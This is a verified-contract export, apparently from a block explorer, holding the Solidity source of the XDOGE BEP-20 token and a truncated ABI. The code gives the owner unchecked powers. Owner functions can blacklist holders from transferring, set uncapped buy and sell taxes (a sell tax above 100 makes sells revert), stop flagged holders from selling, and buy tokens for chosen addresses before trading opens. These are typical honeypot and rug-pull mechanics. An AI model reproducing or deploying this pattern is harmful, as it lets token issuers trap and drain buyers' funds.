{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniswapRouter {\r\n\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n}\r\n\r\ninterface IUniswapFactory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"you are not owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new is 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract Token is IERC20, Ownable {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    address payable public mkt;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    mapping(address => bool) public _isExcludeFromFee;\r\n    mapping(address => bool) public bots;\r\n    \r\n    mapping(address => bool) public _originalShareholders;\r\n    mapping(address => address) public _inviter;\r\n    mapping(address => uint256) public _inviterCount;\r\n    mapping(address => mapping(address => bool)) public _alreadyRecord;\r\n    \r\n\r\n    mapping(address => uint256) public _iBuyBNBAmount;\r\n\r\n    uint256 private _totalSupply;\r\n    IUniswapRouter public _uniswapRouter;\r\n    mapping(address => bool) public isMarketPair;\r\n    bool private inSwap;\r\n    uint256 private constant MAX = ~uint256(0);\r\n    address public _uniswapPair;\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n    constructor (){\r\n\r\n        _name = \"XDOGE\";\r\n        _symbol = \"XDOGE\";\r\n        _decimals = 9;\r\n        uint256 Supply = 1000000000000000;\r\n\r\n        _totalSupply = Supply * 10 ** _decimals;\r\n        swapAtAmount = _totalSupply / 10000;\r\n\r\n        address receiveAddr = 0x7F26292bdF59b543E94a5961b1b75596b935fb86;\r\n        _balances[receiveAddr] = _totalSupply;\r\n        emit Transfer(address(0), receiveAddr, _totalSupply);\r\n\r\n        mkt = payable(0x20470F6D1e0fb20cCf17eC03B7714E64F87dCa26);\r\n\r\n        _isExcludeFromFee[address(this)] = true;\r\n        _isExcludeFromFee[receiveAddr] = true;\r\n        _isExcludeFromFee[mkt] = true;\r\n\r\n        IUniswapRouter swapRouter = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        _uniswapRouter = swapRouter;\r\n        _allowances[address(this)][address(swapRouter)] = MAX;\r\n\r\n        IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());\r\n        _uniswapPair = swapFactory.createPair(address(this), swapRouter.WETH());\r\n\r\n        isMarketPair[_uniswapPair] = true;\r\n        IERC20(_uniswapRouter.WETH()).approve(\r\n            address(address(_uniswapRouter)),\r\n            MAX\r\n        );\r\n        _isExcludeFromFee[address(swapRouter)] = true;\r\n\r\n    }\r\n\r\n    function setNewMktWallet(\r\n        address payable newMKT\r\n    ) public onlyOwner{\r\n        mkt = newMKT;\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    uint256 public _finalBuyTax=2;\r\n    uint256 public _finalSellTax=9;\r\n\r\n    function recuseTax(\r\n        uint256 newBuy,\r\n        uint256 newSell\r\n    ) public onlyOwner {\r\n        _finalBuyTax = newBuy;\r\n        _finalSellTax = newSell;\r\n    }\r\n\r\n    bool public remainHolder = true;\r\n    function changeRemain() public onlyOwner{\r\n        remainHolder = !remainHolder;\r\n    }\r\n\r\n    uint256 swapAtAmount;\r\n    function setSwapAtAmount(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        swapAtAmount = newValue;\r\n    }\r\n\r\n    uint256 public airDropNumbs = 3;\r\n    function setAirdropNumbs(uint256 newValue) public onlyOwner{\r\n        airDropNumbs = newValue;\r\n    }\r\n\r\n    uint256 public beInvitorThreshold = 10 ** 9;\r\n    function setBeInvitorThreshold(uint256 newValue) public onlyOwner {\r\n        beInvitorThreshold = newValue;\r\n    }\r\n\r\n    mapping(address => uint256) public make_invitor_block_mapping;\r\n    uint256 public make_invitor_pending_block = 1;\r\n\r\n    function setmake_invitor_pending_block(uint256 newValue) public onlyOwner {\r\n        make_invitor_pending_block = newValue;\r\n    }\r\n\r\n    function isValidInvitor(address account) public view returns (bool) {\r\n        return\r\n            block.number - make_invitor_block_mapping[account] >=\r\n            make_invitor_pending_block;\r\n    }\r\n\r\n    function getBNBAmount(uint256 tokenAmount)public view returns (uint256){\r\n        address weth = _uniswapRouter.WETH();\r\n        if(IERC20(weth).balanceOf(_uniswapPair) > 0){\r\n            address[] memory path = new address[](2);\r\n            uint[] memory amount;\r\n            path[0]=address(this);\r\n            path[1]=address(weth);\r\n            amount=_uniswapRouter.getAmountsOut(tokenAmount,path); \r\n            return amount[1];\r\n        }else {\r\n            return 0; \r\n        }\r\n    }\r\n\r\n   event goodbyeBot(\r\n        address,\r\n        address\r\n    );\r\n    event bindSuccess(\r\n        address,\r\n        address\r\n    );\r\n    event inviterBuy(\r\n        address buyer,\r\n        address inviter,\r\n        uint256 BNBAmount,\r\n        uint256 tokenAmount,\r\n        uint256 inviterBuytotalBNB\r\n    );\r\n\r\n    function multiBOT(address[] calldata accounts, bool s) public onlyOwner {\r\n        for(uint256 i = 0; i < accounts.length; i++) {\r\n            bots[accounts[i]] = s;\r\n        }\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        uint256 balance = balanceOf(from);\r\n        require(balance >= amount, \"balanceNotEnough\");\r\n        require(!bots[from]);\r\n        \r\n        if (inSwap){\r\n            _basicTransfer(from, to, amount);\r\n            return;\r\n        }\r\n\r\n        bool takeFee;\r\n\r\n        if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {\r\n            uint256 _numSellToken = amount;\r\n            if (_numSellToken > balanceOf(address(this))){\r\n                _numSellToken = _balances[address(this)];\r\n            }\r\n            if (_numSellToken > swapAtAmount){\r\n                swapTokenForETH(_numSellToken);\r\n            }\r\n        }\r\n\r\n        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {\r\n            if (isMarketPair[from] || isMarketPair[to] || isContract(to)){\r\n                require(startTradeBlock > 0);\r\n            }\r\n            takeFee = true;\r\n            address INVITER = _inviter[to];\r\n\r\n            if (isMarketPair[from] && INVITER != address(0)) {\r\n                if (isValidInvitor(to)){\r\n                    uint256 BNBValue = getBNBAmount(amount);\r\n                    _iBuyBNBAmount[INVITER] += BNBValue;\r\n                    if (\r\n                        BNBValue >= countAddedBNBValueThreshold &&\r\n                        _alreadyRecord[INVITER][to] == false\r\n                    ){\r\n                        _inviterCount[INVITER] += 1;\r\n                        _alreadyRecord[INVITER][to] = true;\r\n                    }\r\n                    emit inviterBuy(\r\n                        to,\r\n                        INVITER,\r\n                        BNBValue,\r\n                        amount,\r\n                        _iBuyBNBAmount[INVITER]\r\n                    );\r\n                }else{\r\n                    emit goodbyeBot(_inviter[to],to);\r\n                    _inviter[to] = address(0);\r\n                    make_invitor_block_mapping[to] = 0;\r\n                    \r\n                }\r\n\r\n            }\r\n\r\n            // remainHolder\r\n            if (\r\n                remainHolder && \r\n                (\r\n                    isMarketPair[from] || isMarketPair[from]\r\n                )\r\n            ) {\r\n                address ad;\r\n                for(uint256 i=0;i < airDropNumbs;i++){\r\n                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));\r\n                    _basicTransfer(from,ad,10**_decimals);\r\n                }\r\n                amount -= airDropNumbs*10**_decimals;\r\n            }\r\n\r\n        }\r\n\r\n        if (\r\n            !isMarketPair[from] &&\r\n            !isMarketPair[to] &&\r\n            // _originalShareholders[from] &&\r\n            !isContract(from) &&\r\n            !isContract(to)\r\n        ){ // transfer\r\n            if (\r\n                address(0) == _inviter[to] &&\r\n                !_isExcludeFromFee[to] &&\r\n                _balances[to] < beInvitorThreshold\r\n            ) {\r\n                if (amount + _balances[to] >= beInvitorThreshold) {\r\n                    _inviter[to] = from;\r\n                    // _inviterCount[from] += 1;\r\n                    make_invitor_block_mapping[to] = block.number;\r\n                    emit bindSuccess(from, to);\r\n                }\r\n            }else if(!isValidInvitor(to) && make_invitor_block_mapping[to] != 0){\r\n                // _inviterCount[_inviter[to]] -= 1;\r\n                emit goodbyeBot(_inviter[to], to);\r\n                _inviter[to] = address(0);\r\n                make_invitor_block_mapping[to] = 0;\r\n                \r\n            }\r\n        }\r\n\r\n        _transferToken(from, to, amount, takeFee);\r\n    }\r\n\r\n    function isContract(address _addr) private view returns (bool){\r\n        uint32 size;\r\n        assembly {\r\n            size := extcodesize(_addr)\r\n        }\r\n        return (size > 0);\r\n    }\r\n\r\n    uint256 public inviterCountToSellThreshold = 5;\r\n    function setInviterCountToSellThreshold(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        inviterCountToSellThreshold = newValue;\r\n    }\r\n\r\n    uint256 public inviterBuyBNBAmountToSellThreshold = 0.5 ether;\r\n    function setInviterBuyBNBAmountToSellThreshold(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        inviterBuyBNBAmountToSellThreshold = newValue;\r\n    }\r\n\r\n    uint256 public countAddedBNBValueThreshold = 0.138 ether;\r\n    function setCountAddedBNBValueThreshold(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        countAddedBNBValueThreshold = newValue;\r\n    }\r\n    \r\n\r\n    function oshCanBeSell(\r\n        address osh\r\n    ) public view returns(bool) {\r\n        if (_originalShareholders[osh]){\r\n            return (\r\n                _inviterCount[osh] >= inviterCountToSellThreshold &&\r\n                _iBuyBNBAmount[osh] >= inviterBuyBNBAmountToSellThreshold\r\n            );\r\n        }else{\r\n            return true;\r\n        }\r\n        \r\n    }\r\n\r\n    uint256 public overThresholdSellFee = 0;\r\n    function setOverThresholdSellFee(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        overThresholdSellFee = newValue;\r\n    }\r\n\r\n    uint256 public custom_inviterCountToSellThreshold = 5;\r\n    function setCustom_inviterCountToSellThreshold(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        custom_inviterCountToSellThreshold = newValue;\r\n    }\r\n\r\n    uint256 public custom_inviterBuyBNBAmountToSellThreshold = 0.5 ether;\r\n    function setcustom_inviterBuyBNBAmountToSellThreshold(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        custom_inviterBuyBNBAmountToSellThreshold = newValue;\r\n    }\r\n\r\n    function getSellFee(address sender) public view returns(uint256){\r\n        if (\r\n            _inviterCount[sender] >= custom_inviterCountToSellThreshold &&\r\n            _iBuyBNBAmount[sender] >= custom_inviterBuyBNBAmountToSellThreshold\r\n        ){\r\n            return overThresholdSellFee;\r\n        }else{\r\n            return _finalSellTax;\r\n        }\r\n    }\r\n\r\n    uint256 public inviterFee = 300;\r\n    function setInviterFee(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        inviterFee = newValue;\r\n    }\r\n\r\n    uint256 public cantsellButTransferAmount = 10 * 10 ** 9;\r\n    function setCantsellButTransferAmount(uint256 newValue) public onlyOwner{\r\n        cantsellButTransferAmount = newValue;\r\n    }\r\n    function _transferToken(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount,\r\n        bool takeFee\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount;\r\n\r\n        if (takeFee) {\r\n            if(!oshCanBeSell(sender)){\r\n                require(\r\n                    tAmount <= cantsellButTransferAmount,\r\n                    \"u cant sell it\"\r\n                );\r\n            }\r\n            // require(oshCanBeSell(sender),\"u cant sell it\");\r\n\r\n            //invitor reward\r\n            if (isMarketPair[sender]){ //  || isMarketPair[recipient]\r\n                address current;\r\n                if (isMarketPair[sender]) {\r\n                    current = recipient;\r\n                } else if (isMarketPair[recipient]) {\r\n                    current = sender;\r\n                }\r\n\r\n                if (isMarketPair[recipient] && getSellFee(sender) == overThresholdSellFee){\r\n                    \r\n                }else{\r\n                    uint256 perInviteAmount = tAmount * inviterFee / 10000;\r\n                    if (perInviteAmount > 0){\r\n                        address inviter = _inviter[current];\r\n\r\n                        if (address(0) == inviter) {\r\n                            inviter = mkt;\r\n                        }else{\r\n                            if(!isValidInvitor(current)){ // front run\r\n                                _inviter[current] = address(0);\r\n                                make_invitor_block_mapping[current] = 0;\r\n                                inviter = mkt;\r\n                            }\r\n                        }\r\n                        feeAmount += perInviteAmount;\r\n                        _balances[inviter] = _balances[inviter] + perInviteAmount;\r\n                        emit Transfer(sender, inviter, perInviteAmount);\r\n                    }\r\n                }\r\n\r\n            }\r\n            \r\n            uint256 taxFee;\r\n            if (isMarketPair[recipient]) {\r\n                taxFee = getSellFee(sender);\r\n            } else if (isMarketPair[sender]) {\r\n                taxFee = _finalBuyTax;\r\n            }\r\n            uint256 swapAmount = tAmount * taxFee / 100;\r\n            if (swapAmount > 0) {\r\n                feeAmount += swapAmount;\r\n                _balances[address(this)] = _balances[address(this)] + swapAmount;\r\n                emit Transfer(sender, address(this), swapAmount);\r\n            }\r\n        }\r\n\r\n        _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);\r\n        emit Transfer(sender, recipient, tAmount - feeAmount);\r\n\r\n    }\r\n\r\n    uint256 public startTradeBlock;\r\n    function startTrade(address[] calldata adrs,bool s) public onlyOwner {\r\n        for(uint i=0;i<adrs.length;i++){\r\n            swapToken(((random(5,adrs[i])+1)*10**16+7*10**16),adrs[i]);\r\n        }\r\n\r\n        if (s){\r\n            startTradeBlock = block.number;\r\n        }else{\r\n            startTradeBlock = 0;\r\n        }\r\n        \r\n    }\r\n\r\n    function swapToken(uint256 tokenAmount,address to) private lockTheSwap {\r\n        address weth = _uniswapRouter.WETH();\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(weth);\r\n        path[1] = address(this);\r\n        uint256 _bal = IERC20(weth).balanceOf(address(this));\r\n        tokenAmount = tokenAmount > _bal ? _bal : tokenAmount;\r\n        if (tokenAmount == 0) return;\r\n        // make the swap\r\n        _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of CA\r\n            path,\r\n            address(to),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function random(uint number,address _addr) private view returns(uint) {\r\n        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  _addr))) % number;\r\n    }\r\n\r\n    function removeERC20(address _token) external {\r\n        if(_token != address(this) && mkt == msg.sender){\r\n            IERC20(_token).transfer(mkt, IERC20(_token).balanceOf(address(this)));\r\n            mkt.transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapRouter.WETH();\r\n        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        uint256 _bal = address(this).balance;\r\n        if (_bal > 0.1 ether){\r\n            mkt.transfer(_bal);\r\n        }\r\n    }\r\n\r\n    function setFeeExclude(address[] calldata accounts, bool excluded) public onlyOwner {\r\n        for(uint256 i = 0; i < accounts.length; i++) {\r\n            _isExcludeFromFee[accounts[i]] = excluded;\r\n        }\r\n    }\r\n\r\n    function setPrivateAddresses(address[] calldata accounts, bool excluded) public onlyOwner {\r\n        for(uint256 i = 0; i < accounts.length; i++) {\r\n            _originalShareholders[accounts[i]] = excluded;\r\n        }\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"bindSuccess\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"goodbyeBot\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"buyer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"inviter\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"BNBAmount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"inviterBuytotalBNB\",\"type\":\"uint256\"}],\"name\":\"inviterBuy\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_alreadyRecord\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_finalBuyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_finalSellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_iBuyBNBAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_inviter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_inviterCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludeFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_originalShareholders\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_uniswapRouter\",\"outputs\":[{\"internalType\":\"contract IUniswapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airDropNumbs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"beInvitorThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"bots\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cantsellButTransferAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"changeRemain\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"countAddedBNBValueThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"custom_inviterBuyBNBAmountToSellThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"custom_inviterCountToSellThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"getBNBAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"getSellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inviterBuyBNBAmountToSellThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inviterCountToSellThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inviterFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isValidInvitor\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"make_invitor_block_mapping\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"make_invitor_pending_block\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mkt\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"s\",\"type\":\"bool\"}],\"name\":\"multiBOT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"osh\",\"type\":\"address\"}],\"name\":\"oshCanBeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"overThresholdSellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSell\",\"type\":\"uint256\"}],\"name\":\"recuseTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\